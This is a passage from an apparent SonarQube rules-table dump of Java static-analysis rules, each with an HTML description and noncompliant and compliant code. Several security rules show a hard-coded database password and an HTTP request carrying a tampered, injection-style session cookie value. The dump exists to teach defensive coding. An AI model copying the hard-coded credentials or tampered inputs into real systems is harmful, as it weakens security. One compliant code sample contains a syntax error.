540	TestCases should contain tests	S2187	S2187	squid	<p>There's no point in having a JUnit <code>TestCase</code> without any test methods. Similarly, you shouldn't have a file in the tests directory with "Test" in the name, but not tests in the file. Doing either of these things may lead someone to think that uncovered classes have been tested.</p>\n<p>This rule raises an issue when files in the test directory have "Test" in the name or implement <code>TestCase</code> but don't contain any tests.</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	confusing,tests,unused	f	HTML	1511453807068	1511453807068	1
541	Fields in non-serializable classes should not be "transient"	S2065	S2065	squid	<code>transient</code> is used to mark fields in a <code>Serializable</code> class which will not be written out to file (or stream). In a class that does not implement <code>Serializable</code>, this modifier is simply wasted keystrokes, and should be removed.\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Vegetable {  // does not implement Serializable\n  private transient Season ripe;  // Noncompliant\n  // ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass Vegetable {\n  private Season ripe;\n  // ...\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	serialization,unused	f	HTML	1511453807069	1511453807069	1
542	JUnit assertions should not be used in "run" methods	S2186	S2186	squid	<p>JUnit assertions should not be made from the <code>run</code> method of a <code>Runnable</code>, because failed assertions result in <code>AssertionError</code>s being thrown. If the error is thrown from a thread other than the one that ran the test, the thread will exit but the test won't fail.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic void run() {\n  // ...\n  Assert.assertEquals(expected, actual);  // Noncompliant\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	tests	f	HTML	1511453807069	1511453807070	2
543	Credentials should not be hard-coded	S2068	S2068	squid	<p>Because it is easy to extract strings from a compiled application, credentials should never be hard-coded. Do so, and they're almost guaranteed to end up in the hands of an attacker. This is particularly true for applications that are distributed.</p>\n<p>Credentials should be stored outside of the code in a strongly-protected encrypted configuration file or database.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nConnection conn = null;\ntry {\n  conn = DriverManager.getConnection("jdbc:mysql://localhost/test?" +\n        "user=steve&amp;password=blue"); // Noncompliant\n  String uname = "steve";\n  String password = "blue";\n  conn = DriverManager.getConnection("jdbc:mysql://localhost/test?" +\n        "user=" + uname + "&amp;password=" + password); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nConnection conn = null;\ntry {\n  String uname = getEncryptedUser();\n  String password = getEncryptedPass();\n  conn = DriverManager.getConnection("jdbc:mysql://localhost/test?" +\n        "user=" + uname + "&amp;password=" + password);\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/798">MITRE, CWE-798</a> - Use of Hard-coded Credentials</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/259">MITRE, CWE-259</a> - Use of Hard-coded Password</li>\n<li> <a href="http://www.sans.org/top25-software-errors/">SANS Top 25</a> - Porous Defenses</li>\n<li> <a href="https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management">OWASP Top Ten 2013 Category A2</a> - Broken Authentication and Session Management</li>\n<li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a></li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	cwe,owasp-a2,sans-top25-porous	f	HTML	1511453807070	1511453807071	3
544	Loops should not be infinite	S2189	S2189	squid	<p>An infinite loop is one that will never end while the program is running, I.E. you have to kill the program to get out of the loop. Whether it is by meeting the loop's end condition or via a <code>break</code>, every loop should have an end condition.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (;;) {  // Noncompliant; end condition omitted\n  // ...\n}\n\nfor (int i = 0; i < 10; i--) { // Noncompliant; end condition but unreachedable\n  //...\n}\n\nint j;\nwhile (true) { // Noncompliant; end condition omitted\n  j++;\n}\n\nint k;\nboolean b = true;\nwhile (b) { // Noncompliant; b never written to in loop\n  k++;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfor (int i = 0; i < 10; i++) { // end condition now reachable\n  //...\n}\n\nint j;\nwhile (true) { // reachable end condition added\n  j++;\n  if (j  == Integer.MIN_VALUE) {  // true at Integer.MAX_VALUE +1\n    break;\n  }\n}\n\nint k;\nboolean b = true;\nwhile (b) {\n  k++;\n  b = k < Integer.MAX_VALUE;\n}\n</pre>\n<h2> See</h2>\n<ul>\n<li><a href="https://www.securecoding.cert.org/confluence/x/PYHfAw">CERT, MSC01-J.</a> - Do not use an empty infinite loop</li>\n</ul>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	cert	f	HTML	1511453807072	1511453807072	2
545	Assignments should not be made from within sub-expressions	AssignmentInSubExpressionCheck	AssignmentInSubExpressionCheck	squid	<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable.</p>\n<p>It is also a common mistake to write <code>=</code> when <code>==</code> was meant.</p>\n<p>Ideally, expressions should not have side-effects.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\ndoSomething(i = 42);\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\ni = 42;\ndoSomething(i);   \n</pre>\n<p>or</p>\n<pre>\ndoSomething(i == 42);  // Perhaps in fact the assignment operator was expected\n</pre>\n<h2>Exceptions</h2>\n\n<p>Assignments in <code>while</code> statement conditions, and assignments enclosed in relational expressions are allowed.</p>\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2004, 13.1 - Assignment operators shall not be used in expressions that yield a Boolean value</li>\n<li> MISRA C++:2008, 6-2-1 - Assignment operators shall not be used in sub-expressions</li>\n<li> MISRA C:2012, 13.4 - The result of of an assignment operator should not be used</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/481.html">MITRE, CWE-481</a> - Assigning instead of Comparing</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cwe,misra	f	HTML	1511453807072	1511453807073	2
546	"private" methods called only by inner classes should be moved to those classes	S3398	S3398	squid	<p>When a <code>private</code> method is only invoked by an inner class, there's no reason not to move it into that class. It will still have the same access to the outer class' members, but the outer class will be clearer and less cluttered.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Outie {\n  private int i=0;\n\n  private void increment() {  // Noncompliant\n    i++;\n  }\n\n  public class Innie {\n    public void doTheThing() {\n      Outie.this.increment();\n    }\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Outie {\n  private int i=0;\n\n  public class Innie {\n    public void doTheThing() {\n      Outie.this.increment();\n    }\n\n    private void increment() {\n      Outie.this.i++;\n    }\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	confusing	f	HTML	1511453807074	1511453807074	1
547	JUnit test cases should call super methods	S2188	S2188	squid	<p>Overriding a parent class method prevents that method from being called unless an explicit <code>super</code> call is made in the overriding method. In some cases not calling the <code>super</code> method is acceptable, but not with <code>setUp</code> and <code>tearDown</code> in a JUnit 3 <code>TestCase</code>.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class MyClassTest extends MyAbstractTestCase {\n\n  private MyClass myClass;\n    @Override\n    protected void setUp() throws Exception {  // Noncompliant\n      myClass = new MyClass();\n    }\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class MyClassTest extends MyAbstractTestCase {\n\n  private MyClass myClass;\n    @Override\n    protected void setUp() throws Exception {\n      super.setUp();\n      myClass = new MyClass();\n    }\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	tests	f	HTML	1511453807074	1511453807075	2
548	Abstract methods should not be redundant	S3038	S3038	squid	<p>There's no point in redundantly defining an <code>abstract</code> method with the same signature as a method in an <code>interface</code> that the class <code>implements</code>. Any concrete child classes will have to implement the method either way.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic interface Reportable {\n  String getReport();\n}\n\npublic abstract class AbstractRuleReport implements Reportable{\n  public abstract String getReport();  // Noncompliant\n\n  // ...\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	confusing	f	HTML	1511453807076	1511453807076	1
549	The ternary operator should not be used	S1774	S1774	squid	<p>While the ternary operator is pleasingly compact, it's use can make code more difficult to read. It should therefore be avoided in favor of the more verbose <code>if</code>/<code>else</code> structure.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nSystem.out.println(i>10?"yes":"no");\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (i > 10) {\n  System.out.println(("yes");\n} else {\n  System.out.println("no");\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	brain-overload	f	HTML	1511453807077	1511453807077	1
550	"entrySet()" should be iterated when both the key and value are needed	S2864	S2864	squid	<p>When only the keys from a map are needed in a loop, iterating the <code>keySet</code> makes sense. But when both the key and the value are needed, it's more efficient to iterate the <code>entrySet</code>, which will give access to both the key and value, instead.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomethingWithMap(Map&lt;String,Object&gt; map) {\n  for (String key : map.keySet()) {  // Noncompliant; for each key the value is retrieved\n    Object value = map.get(key);\n    // ...\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomethingWithMap(Map&lt;String,Object&gt; map) {\n  for (Map.Entry&lt;String,Object&gt; entry : map.entrySet()) {\n    String key = entry.getKey();\n    Object value = entry.getValue();\n    // ...\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	performance	f	HTML	1511453807078	1511453807078	1
551	Methods should not have too many lines	S138	S138	squid	<p>\nA method that grows too large tends to aggregate too many responsibilities.\nSuch method inevitably become harder to understand and therefore harder to maintain.\n</p>\n\n<p>\nAbove a specific threshold, it is strongly advised to refactor into smaller methods which focus on well-defined tasks.\nThose smaller methods will not only be easier to understand, but also probably easier to test.\n</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	brain-overload	f	HTML	1511453807080	1511453807080	1
552	Public methods should throw at most one checked exception	S1160	S1160	squid	<p>\n  Using checked exceptions forces method callers to deal with errors, either by propagating them or by handling them.\n  This makes those exceptions fully part of the API of the method.\n</p>\n\n<p>\n  To keep the complexity for callers reasonable, methods should not throw more than one kind of checked exception.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void delete() throws IOException, SQLException {      // Noncompliant\n  /* ... */\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void delete() throws SomeApplicationLevelException {\n  /* ... */\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n  Overriding methods are not checked by this rule and are allowed to throw several checked exceptions.\n</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	error-handling	f	HTML	1511453807081	1511453807082	1
553	Loops should not contain more than a single "break" or "continue" statement	S135	S135	squid	<p>Restricting the number of <code>break</code> and <code>continue</code> statements in a loop is done in the interest of good structured programming. </p>\n<p>One <code>break</code> and <code>continue</code> statement is acceptable in a loop, since it facilitates optimal coding. If there is more than one, the code should be refactored to increase readability.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nfor (int i = 1; i &lt;= 10; i++) {     // Noncompliant - 2 continue - one might be tempted to add some logic in between\n  if (i % 2 == 0) {\n    continue;\n  }\n\n  if (i % 3 == 0) {\n    continue;\n  }\n\n  System.out.println("i = " + i);\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	LINEAR	\N	20min	\N	\N	per extra "break" or "continue" statement	\N	brain-overload	f	HTML	1511453807082	1511453807083	1
554	"@Override" annotation should be used on any method overriding (since Java 5) or implementing (since Java 6) another one	S1161	S1161	squid	<p>Using the <code>@Override</code> annotation is useful for two reasons :</p>\n<ul>\n  <li>It elicits a warning from the compiler if the annotated method doesn't actually override anything, as in the case of a misspelling.</li>\n  <li>It improves the readability of the source code by making it obvious that methods are overridden.</li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass ParentClass {\n  public boolean doSomething(){...}\n}\nclass FirstChildClass extends ParentClass {\n  public boolean doSomething(){...}  // Noncompliant\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass ParentClass {\n  public boolean doSomething(){...}\n}\nclass FirstChildClass extends ParentClass {\n  @Override\n  public boolean doSomething(){...}  // Compliant\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	bad-practice	f	HTML	1511453807083	1511453807084	1
560	Literal suffixes should be upper case	S818	S818	squid	<p>Using upper case literal suffixes removes the potential ambiguity between "1" (digit 1) and "l" (letter el) for declaring literals.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nlong long1 = 1l; // Noncompliant\nfloat float1 = 1.0f; // Noncompliant\ndouble double1 = 1.0d; // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nlong long1 = 1L;\nfloat float1 = 1.0F;\ndouble double1 = 1.0D;\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> MISRA C++:2008, 2-13-4 - Literal suffixes shall be upper case\n</li><li> MISRA C:2012, 7.3 - The lowercase character "l" shall not be used in a literal suffix\n</li><li> <a href="https://www.securecoding.cert.org/confluence/x/koAtAQ">CERT DCL16-C</a> - Use "L," not "l," to indicate a long value\n</li><li> <a href="https://www.securecoding.cert.org/confluence/x/n4AtAQ">CERT DCL16-CPP</a> - Use "L," not "l," to indicate a long value\n</li></ul>\n<h3>See Also</h3>\n\n<ul>\n<li> {rule:squid:S1129} - Long suffix "L" should be upper case\n</li></ul>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	cert,convention,misra,pitfall	f	HTML	1511453807089	1511453807090	1
561	Long suffix "L" should be upper case	LowerCaseLongSuffixCheck	LowerCaseLongSuffixCheck	squid	<p>The long suffix should always be written in uppercase, i.e. 'L', as the lowercase 'l' can easily be confused with the digit one '1'.</p>\n<p>The following code:</p>\n<pre>\nlong n = 10l;  // Noncompliant - easily confused with one zero one\n</pre>\n<p>should be refactored into:</p>\n<pre>\nlong n = 10L;  // Compliant\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	\N	f	HTML	1511453807091	1511453807091	1
562	Deprecated elements should have both the annotation and the Javadoc tag	MissingDeprecatedCheck	MissingDeprecatedCheck	squid	<p>Deprecation should be marked with both the <code>@Deprecated</code> annotation and @deprecated Javadoc tag. The annotation enables tools such as IDEs to warn about referencing deprecated elements, and the tag can be used to explain when it was deprecated, why, and how references should be refactored.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyClass {\n\n  @Deprecated\n  public void foo1() {\n  }\n\n  /**\n    * @deprecated\n    */\n  public void foo2() {    // Noncompliant\n  }\n\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass MyClass {\n\n  /**\n    * @deprecated (when, why, refactoring advice...)\n    */\n  @Deprecated\n  public void foo1() {\n  }\n\n  /**\n    * @deprecated (when, why, refactoring advice...)\n    */\n  @Deprecated\n  public void foo2() {\n  }\n\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>The members and methods of a deprecated class or interface are ignored by this rule. The classes and interfaces themselves are still subject to it.</p>\n\n<pre>\n/**\n * @deprecated (when, why, etc...)\n */\n@Deprecated\nclass Qix  {\n\n  public void foo() {} // Compliant; class is deprecated\n\n}\n\n/**\n * @deprecated (when, why, etc...)\n */\n@Deprecated\ninterface Plop {\n\n  void bar();\n\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	bad-practice,obsolete	f	HTML	1511453807092	1511453807092	1
563	Lamdbas containing only one statement should not nest this statement in a block	S1602	S1602	squid	<p>There are two ways to write lambdas that contain single statement, but one is definitely more compact and readable than the other.</p>\n\n<p>\n  <strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nx -&gt; {System.out.println(x+1);}\n(a, b) -&gt; { return a+b; }\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nx -&gt; System.out.println(x+1)\n(a, b) -&gt; a+b    //For return statement, the return keyword should also be dropped\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	java8	f	HTML	1511453807093	1511453807094	1
564	"Object.wait(...)" should never be called on objects that implement "java.util.concurrent.locks.Condition"	S1844	S1844	squid	<p>From the Java API documentation:</p>\n<blockquote>\n<code>Condition</code> factors out the <code>Object</code> monitor methods (<code>wait</code>, <code>notify</code> and <code>notifyAll</code>) into distinct objects to give the effect of having multiple wait-sets per object, by combining them with the use of arbitrary Lock implementations. Where a <code>Lock</code> replaces the use of <code>synchronized</code> methods and statements, a <code>Condition</code> replaces the use of the <code>Object</code> monitor methods.\n</blockquote>\n\nThe purpose of implementing the <code>Condition</code> interface is to gain access to its more nuanced <code>await</code> methods. Therefore, calling the method <code>Object.wait(...)</code> on a class implementing the <code>Condition</code> interface is silly and confusing.\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nfinal Lock lock = new ReentrantLock();\nfinal Condition notFull  = lock.newCondition();\n...\nnotFull.wait();\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfinal Lock lock = new ReentrantLock();\nfinal Condition notFull  = lock.newCondition();\n...\nnotFull.await();\n</pre>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	pitfall	f	HTML	1511453807094	1511453807095	2
565	Deprecated classes and interfaces should not be extended/implemented	S1724	S1724	squid	<p>Deprecated classes and interfaces should be avoided, rather than used, inherited or extended. Deprecation is a warning that the class or interface has been superseded, and will eventually be removed. The deprecation period allows you to make a smooth transition away from the aging, soon-to-be-retired technology.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n/**\n* @deprecated  As of release 1.3, replaced by {@link #Fee}\n*/@Deprecated\nclass Foo { ... }\n\nclass Bar extends Foo { ... }\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass Bar extends Fee { ... }\n</pre>\n\n<h2>Exception</h2>\n<p>When the class that extends a deprecated class is itself deprecated, the extending class will be ignored.</p>\n<pre>\n@Deprecated\nclass Bar extends Foo { ... } // compliant Bar is deprecated.\n</pre>\n\n  <h2>See</h2>\n    <ul>\n      <li><a href="http://cwe.mitre.org/data/definitions/477.html">MITRE, CWE-477</a> - Use of Obsolete Functions</li>\n    </ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	cwe,obsolete	f	HTML	1511453807096	1511453807096	1
572	Exceptions should not be thrown in finally blocks	S1163	S1163	squid	<p>\nThrowing an exception from within a finally block will mask any exception which was previously thrown in the <code>try</code> or <code>catch</code> block.\nThe masked's exception message and stack trace will be lost.\n</p>\n\n<p>The following code:</p>\n\n<pre>\ntry {\n  /* some work which end up throwing an exception */\n  throw new IllegalArgumentException();\n} finally {\n  /* clean up */\n  throw new RuntimeException();                          // Noncompliant - will mask the IllegalArgumentException\n}\n</pre>\n\n<p>should be refactored into:</p>\n\n<pre>\ntry {\n  /* some work which end up throwing an exception */\n  throw new IllegalArgumentException();\n} finally {\n  /* clean up */                                         // Compliant\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	error-handling	f	HTML	1511453807103	1511453807103	1
566	Methods and field names should not be the same or differ only by capitalization	S1845	S1845	squid	<p>Looking at the set of methods in a class, including superclass methods, and finding two methods or fields that differ only by capitalization is confusing to users of the class. It is similarly confusing to have a method and a field which differ only in capitalization or a method and a field with exactly the same name and visibility.</p>\n<p>In the case of methods, it may have been a mistake on the part of the original developer, who intended to override a superclass method, but instead added a new method with nearly the same name.</p>\n<p>Otherwise, this situation simply indicates poor naming. Method names should be action-oriented, and thus contain a verb, which is unlikely in the case where both a method and a member have the same name (with or without capitalization differences). However, renaming a public method could be disruptive to callers. Therefore renaming the member is the recommended action.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class Car{\n\n  public DriveTrain drive;\n\n  public void tearDown(){...}\n\n  public void drive() {...}  // Noncompliant; duplicates field name\n}\n\npublic class MyCar extends Car{\n  public void teardown(){...}  // Noncompliant; not an override. It it really what's intended?\n\n  public void drivefast(){...} \n\n  public void driveFast(){...} //Huh?\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class Car{\n\n  private DriveTrain drive;\n\n  public void tearDown(){...}\n\n  public void drive() {...}  // field visibility reduced\n}\n\npublic class MyCar extends Car{\n  @Override\n  public void tearDown(){...}\n\n  public void drivefast(){...} \n\n  public void driveReallyFast(){...}\n\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	confusing	f	HTML	1511453807097	1511453807097	1
567	Anonymous inner classes containing only one method should become lambdas	S1604	S1604	squid	<p>Before Java 8, the only way to partially support closures in Java was by using anonymous inner classes. But the syntax of anonymous classes may seem unwieldy and unclear.</p>\n\n<p>With Java 8, most uses of anonymous inner classes should be replaced by lambdas to highly increase the readability of the source code.</p>\n\n<p>\n  <strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nmyCollection.map(new Mapper&lt;String,String&gt;() {\n  public String map(String input) {\n    return new StringBuilder(input).reverse().toString();\n  }\n});\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nmyCollection.map(element -&gt; new StringBuilder(element).reverse().toString());\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	java8	f	HTML	1511453807099	1511453807099	1
568	Objects should not be created to be dropped immediately without being used	S1848	S1848	squid	There is no good reason to create a new object to not do anything with it. Most of the time, this is due to a missing piece of code and so could lead to an unexpected behavior in production.\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (x &lt; 0)\n  new IllegalArgumentException("x must be nonnegative");\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (x &lt; 0)\n  throw new IllegalArgumentException("x must be nonnegative");\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	unused	f	HTML	1511453807100	1511453807100	2
569	"Iterator.hasNext()" should not call "Iterator.next()"	S1849	S1849	squid	Calling <code>Iterator.hasNext()</code> is not supposed to have any side effects, and therefore should not change the state of the iterator. <code>Iterator.next()</code> advances the iterator by one item. So calling it inside <code>Iterator.hasNext()</code>, breaks the <code>hasNext()</code> contract, and will lead to unexpected behavior in production.\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class FibonacciIterator implements Iterator&lt;Integer&gt;{\n...\n@Override\npublic boolean hasNext() {\n  if(next() != null) {\n    return true;\n  }\n  return false;\n}\n...\n}\n</pre>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	\N	f	HTML	1511453807101	1511453807101	2
570	Skipped unit tests should be either removed or fixed	S1607	S1607	squid	Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	pitfall,tests	f	HTML	1511453807101	1511453807102	1
576	Exception classes should be immutable	S1165	S1165	squid	<p>Exceptions are meant to represent the application's state at which an error occurred.</p>\n<p>Making all fields final ensures that this state:</p>\n<ul>\n<li> Will be fully defined at the same time the exception is instantiated.</li>\n<li> Won't be updated or corrupted by some bogus error handler.</li>\n</ul>\n<p>This will enable developers to quickly understand what went wrong.</p>\n<p>The following code:</p>\n<pre>\npublic class MyException extends Exception {\n\n  private int status;                               // Noncompliant\n\n  public MyException(String message) {\n    super(message);\n  }\n\n  public int getStatus() {\n    return status;\n  }\n\n  public void setStatus(int status) {\n    this.status = status;\n  }\n\n}\n</pre>\n<p>should be refactored into:</p>\n<pre>\npublic class MyException extends Exception {\n\n  private final int status;                         // Compliant\n\n  public MyException(String message, int status) {\n    super(message);\n    this.status = status;\n  }\n\n  public int getStatus() {\n    return status;\n  }\n\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	error-handling	f	HTML	1511453807108	1511453807108	1
577	Classes extending java.lang.Thread should override the "run" method	S2134	S2134	squid	<p>According to the Java API documentation:</p>\n<blockquote>\nThere are two ways to create a new thread of execution. One is to declare a class to be a subclass of Thread. This subclass should override the run method of class Thread. An instance of the subclass can then be allocated and started...\nThe other way to create a thread is to declare a class that implements the Runnable interface. That class then implements the run method. An instance of the class can then be allocated, passed as an argument when creating Thread, and started.\n</blockquote>\n\n<p>By definition, extending the Thread class without overriding the <code>run</code> method doesn't make sense, and implies that the contract of the <code>Thread</code> class is not well understood.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyRunner extends Thread { // Noncompliant; run method not overridden\n\n  public void doSometing() {...}\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	multi-threading,pitfall	f	HTML	1511453807110	1511453807110	1
578	Exception handlers should preserve the original exception	S1166	S1166	squid	<p>When handling a caught exception, the original exception's message and stack trace should be logged or passed forward.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\n // Noncompliant - exception is lost\ntry { /* ... */ } catch (Exception e) { LOGGER.info("context"); }   \n\n// Noncompliant - exception is lost (only message is preserved)       \ntry { /* ... */ } catch (Exception e) { LOGGER.info(e.getMessage()); }   \n\n// Noncompliant - exception is lost \ntry { /* ... */ } catch (Exception e) { throw new RuntimeException("context"); }\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\ntry { /* ... */ } catch (Exception e) { LOGGER.info(e); }   \n\ntry { /* ... */ } catch (Exception e) { throw new RuntimeException(e); }\n\ntry {\n  /* ... */\n} catch (RuntimeException e) {\n  doSomething();\n  throw e;\n} catch (Exception e) {\n  // Conversion into unchecked exception is also allowed\n  throw new RuntimeException(e);\n}\n</pre>\n<h2>Exceptions</h2>\n\n<p><code>InterruptedException</code>, <code>NumberFormatException</code>, <code>ParseException</code> and <code>MalformedURLException</code> exceptions are arguably used to indicate nonexceptional outcomes.</p>\n<p>Because they are part of Java, developers have no choice but to deal with them. This rule does not verify that those particular exceptions are correctly handled.</p>\n<pre>\nint myInteger;\ntry {\n  myInteger = Integer.parseInt(myString);\n} catch (NumberFormatException e) {\n  // It is perfectly acceptable to not handle "e" here\n  myInteger = 0;\n}\n\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	error-handling	f	HTML	1511453807110	1511453807111	1
585	"javax.crypto.NullCipher" should not be used for anything other than testing	S2258	S2258	squid	<p>By contract, the <code>NullCipher</code> class provides an "identity cipher" -- one that does not transform or encrypt the plaintext in any way. As a consequence, the ciphertext is identical to the plaintext. So this class should be used for testing, and never in production code.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nNullCipher nc=new NullCipher();\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/327.html">CWE-327</a>: Use of a Broken or Risky Cryptographic Algorithm</li>\n<li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure</li>\n<li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#NULL_CIPHER">NullCipher Unsafe</a></li>\n</ul>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	cwe,owasp-a6,sans-top25-porous	f	HTML	1511453807118	1511453807119	3
579	"HttpServletRequest.getRequestedSessionId()" should not be used	S2254	S2254	squid	<p>According to the Oracle Java API, the <code>HttpServletRequest.getRequestedSessionId()</code> method:</p>\n<blockquote>\n<p>Returns the session ID specified by the client. This may not be the same as the ID of the current valid session for this request. If the client did not specify a session ID, this method returns null.</p>\n</blockquote>\n<p>The session ID it returns is either transmitted in a cookie or a URL parameter so by definition, nothing prevents the end-user from manually updating the value of this session ID in the HTTP request. </p>\n<p>Here is an example of a updated HTTP header:</p>\n<pre>\nGET /pageSomeWhere HTTP/1.1\nHost: webSite.com\nUser-Agent: Mozilla/5.0\nCookie: JSESSIONID=Hacked_Session_Value'''"&gt;\n</pre>\n<p>Due to the ability of the end-user to manually change the value, the session ID in the request should only be used by a servlet container (E.G. Tomcat or Jetty) to see if the value matches the ID of an an existing session. If it does not, the user should be considered  unauthenticated. Moreover, this session ID should never be logged to prevent hijacking of active sessions.</p>\n\n<h2>Noncompliant Code 